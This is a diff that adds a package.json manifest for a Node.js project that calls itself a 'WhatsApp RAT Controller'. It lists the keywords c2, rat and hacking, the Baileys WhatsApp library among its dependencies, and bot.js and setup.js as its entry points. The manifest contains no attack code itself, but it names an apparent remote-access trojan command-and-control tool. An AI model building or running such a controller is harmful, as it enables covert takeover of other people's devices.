@@ -1,0 +1,31 @@
+{
+  "name": "t0ol-b4s3-263",
+  "version": "1.0.0",
+  "description": "WhatsApp RAT Controller",
+  "main": "bot.js",
+  "type": "module",
+  "scripts": {
+    "setup": "node setup.js",
+    "start": "node bot.js",
+    "dev": "node --watch bot.js"
+  },
+  "keywords": [
+    "whatsapp",
+    "bot",
+    "c2",
+    "rat",
+    "hacking"
+  ],
+  "author": "Hxcker-263",
+  "license": "MIT",
+  "dependencies": {
+    "@whiskeysockets/baileys": "^6.7.8",
+    "axios": "^1.7.2",
+    "chalk": "^5.3.0",
+    "form-data": "^4.0.0",
+    "moment": "^2.30.1",
+    "pino": "^9.0.0",
+    "qrcode-terminal": "^0.12.0",
+    "sharp": "^0.33.4"
+  }
+}
